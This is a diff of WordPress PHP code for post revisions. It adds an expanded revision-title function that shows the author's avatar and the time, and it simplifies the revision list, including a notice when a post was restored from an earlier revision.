 	if ( $link && current_user_can( 'edit_post', $revision->ID ) && $link = get_edit_post_link( $revision->ID ) )
@@ -1335,144 +1331,128 @@ function wp_post_revision_title( $revision, $link = true ) {
 }
 
 /**
+ * Retrieve formatted date timestamp of a revision (linked to that revisions's page).
+ *
+ * @package WordPress
+ * @subpackage Post_Revisions
+ * @since 3.6.0
+ *
+ * @uses date_i18n()
+ *
+ * @param int|object $revision Revision ID or revision object.
+ * @param bool $link Optional, default is true. Link to revisions's page?
+ * @return string gravatar, user, i18n formatted datetimestamp or localized 'Current Revision'.
+ */
+function wp_post_revision_title_expanded( $revision, $link = true ) {
+	if ( !$revision = get_post( $revision ) )
+		return $revision;
+
+	if ( !in_array( $revision->post_type, array( 'post', 'page', 'revision' ) ) )
+		return false;
+
+	$author = get_the_author_meta( 'display_name', $revision->post_author );
+	/* translators: revision date format, see http://php.net/date */
+	$datef = _x( 'j F, Y @ G:i:s', 'revision date format');
+
+	$gravatar = get_avatar( $revision->post_author, 24 );
+
+	$date = date_i18n( $datef, strtotime( $revision->post_modified ) );
+	if ( $link && current_user_can( 'edit_post', $revision->ID ) && $link = get_edit_post_link( $revision->ID ) )
+		$date = "<a href='$link'>$date</a>";
+
+	$revision_date_author = sprintf(
+		/* translators: post revision title: 1: author avatar, 2: author name, 3: time ago, 4: date */
+		_x( '%1$s %2$s, %3$s ago (%4$s)', 'post revision title' ),
+		$gravatar,
+		$author,
+		human_time_diff( strtotime( $revision->post_modified ), current_time( 'timestamp' ) ),
+		$date
+	);
+
+	$autosavef = __( '%1$s [Autosave]' );
+	$currentf  = __( '%1$s [Current Revision]' );
+
+	if ( !wp_is_post_revision( $revision ) )
+		$revision_date_author = sprintf( $currentf, $revision_date_author );
+	elseif ( wp_is_post_autosave( $revision ) )
+		$revision_date_author = sprintf( $autosavef, $revision_date_author );
+
+	return $revision_date_author;
+}
+
+/**
  * Display list of a post's revisions.
  *
  * Can output either a UL with edit links or a TABLE with diff interface, and
  * restore action links.
- *
- * Second argument controls parameters:
- *   (bool)   parent : include the parent (the "Current Revision") in the list.
- *   (string) format : 'list' or 'form-table'. 'list' outputs UL, 'form-table'
- *                     outputs TABLE with UI.
- *   (int)    right  : what revision is currently being viewed - used in
- *                     form-table format.
- *   (int)    left   : what revision is currently being diffed against right -
- *                     used in form-table format.
  *
  * @package WordPress
  * @subpackage Post_Revisions
  * @since 2.6.0
  *
  * @uses wp_get_post_revisions()
- * @uses wp_post_revision_title()
+ * @uses wp_post_revision_title_expanded()
  * @uses get_edit_post_link()
  * @uses get_the_author_meta()
  *
- * @todo split into two functions (list, form-table) ?
- *
  * @param int|object $post_id Post ID or post object.
- * @param string|array $args See description {@link wp_parse_args()}.
+ * @param string $type 'all' (default), 'revision' or 'autosave'
  * @return null
  */
-function wp_list_post_revisions( $post_id = 0, $args = null ) {
-	if ( !$post = get_post( $post_id ) )
+function wp_list_post_revisions( $post_id = 0, $type = 'all' ) {
+	if ( ! $post = get_post( $post_id ) )
 		return;
 
-	$defaults = array( 'parent' => false, 'right' => false, 'left' => false, 'format' => 'list', 'type' => 'all' );
-	extract( wp_parse_args( $args, $defaults ), EXTR_SKIP );
-
-	switch ( $type ) {
-		case 'autosave' :
-			if ( !$autosave = wp_get_post_autosave( $post->ID ) )
-				return;
-			$revisions = array( $autosave );
-			break;
-		case 'revision' : // just revisions - remove autosave later
-		case 'all' :
-		default :
-			if ( !$revisions = wp_get_post_revisions( $post->ID ) )
-				return;
-			break;
+	// $args array with (parent, format, right, left, type) deprecated since 3.6
+	if ( is_array( $type ) ) {
+		$type = ! empty( $type['type'] ) ? $type['type']  : $type;
+		_deprecated_argument( __FUNCTION__, '3.6' );
 	}
 
-	/* translators: post revision: 1: when, 2: author name */
-	$titlef = _x( '%1$s by %2$s', 'post revision' );
+	if ( ! $revisions = wp_get_post_revisions( $post->ID ) )
+		return;
 
-	if ( $parent )
-		array_unshift( $revisions, $post );
-
-	$rows = $right_checked = '';
-	$class = false;
-	$can_edit_post = current_user_can( 'edit_post', $post->ID );
+	$rows = '';
 	foreach ( $revisions as $revision ) {
-		if ( !current_user_can( 'read_post', $revision->ID ) )
-			continue;
-		if ( 'revision' === $type && wp_is_post_autosave( $revision ) )
+		if ( ! current_user_can( 'read_post', $revision->ID ) )
 			continue;
 
-		$date = wp_post_revision_title( $revision );
-		$name = get_the_author_meta( 'display_name', $revision->post_author );
+		$is_autosave = wp_is_post_autosave( $revision );
+		if ( ( 'revision' === $type && $is_autosave ) || ( 'autosave' === $type && ! $is_autosave ) )
+			continue;
 
-		if ( 'form-table' == $format ) {
-			if ( $left )
-				$left_checked = $left == $revision->ID ? ' checked="checked"' : '';
-			else
-				$left_checked = $right_checked ? ' checked="checked"' : ''; // [sic] (the next one)
-			$right_checked = $right == $revision->ID ? ' checked="checked"' : '';
-
-			$class = $class ? '' : " class='alternate'";
-
-			if ( $post->ID != $revision->ID && $can_edit_post )
-				$actions = '<a href="' . wp_nonce_url( add_query_arg( array( 'revision' => $revision->ID, 'action' => 'restore' ) ), "restore-post_$post->ID|$revision->ID" ) . '">' . __( 'Restore' ) . '</a>';
-			else
-				$actions = '';
-
-			$rows .= "<tr$class>\n";
-			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='left' value='$revision->ID'$left_checked /></th>\n";
-			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='right' value='$revision->ID'$right_checked /></th>\n";
-			$rows .= "\t<td>$date</td>\n";
-			$rows .= "\t<td>$name</td>\n";
-			$rows .= "\t<td class='action-links'>$actions</td>\n";
-			$rows .= "</tr>\n";
-		} else {
-			$title = sprintf( $titlef, $date, $name );
-			$rows .= "\t<li>$title</li>\n";
-		}
+		$rows .= "\t<li>" . wp_post_revision_title_expanded( $revision ) . "</li>\n";
 	}
 
-	if ( 'form-table' == $format ) : ?>
+	echo "<div class='hide-if-js'><p>" . __( 'JavaScript must be enabled to use this feature.' ) . "</p></div>\n";
 
-<form action="revision.php" method="get">
+	echo "<ul class='post-revisions hide-if-no-js'>\n";
+	echo $rows;
 
-<div class="tablenav">
-	<div class="alignleft">
-		<input type="submit" class="button-secondary" value="<?php esc_attr_e( 'Compare Revisions' ); ?>" />
-		<input type="hidden" name="action" value="diff" />
-		<input type="hidden" name="post_type" value="<?php echo esc_attr($post->post_type); ?>" />
-	</div>
-</div>
-
-<br class="clear" />
-
-<table class="widefat post-revisions" cellspacing="0" id="post-revisions">
-	<col />
-	<col />
-	<col style="width: 33%" />
-	<col style="width: 33%" />
-	<col style="width: 33%" />
-<thead>
-<tr>
-	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'Old', 'revisions column name' ); ?></th>
-	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'New', 'revisions column name' ); ?></th>
-	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'Date Created', 'revisions column name' ); ?></th>
-	<th scope="col"><?php _e( 'Author' ); ?></th>
-	<th scope="col" class="action-links"><?php _e( 'Actions' ); ?></th>
-</tr>
-</thead>
-<tbody>
-
-<?php echo $rows; ?>
-
-</tbody>
-</table>
-
-</form>
-
-<?php
-	else :
-		echo "<ul class='post-revisions'>\n";
-		echo $rows;
+	// if the post was previously restored from a revision
+	// show the restore event details
+	if ( $restored_from_meta = get_post_meta( $post->ID, '_post_restored_from', true ) ) {
+		$author = get_user_by( 'id', $restored_from_meta[ 'restored_by_user' ] );
+		/* translators: revision date format, see http://php.net/date */
+		$datef = _x( 'j F, Y @ G:i:s', 'revision date format');
+		$date = date_i18n( $datef, strtotime( $restored_from_meta[ 'restored_time' ] ) );
+		$time_diff = human_time_diff( $restored_from_meta[ 'restored_time' ] ) ;
+		?>
+		<hr />
+		<div id="revisions-meta-restored">
+			<?php
+			printf(
+				/* translators: restored revision details: 1: gravatar image, 2: author name, 3: time ago, 4: date */
+				__( 'Previously restored by %1$s %2$s, %3$s ago (%4$s)' ),
+				get_avatar( $author->ID, 24 ),
+				$author->display_name,
+				$time_diff,
+				$date
+			);
+			?>
+		</div>
+		<?php
 		echo "</ul>";
-	endif;
+	}
 
 }
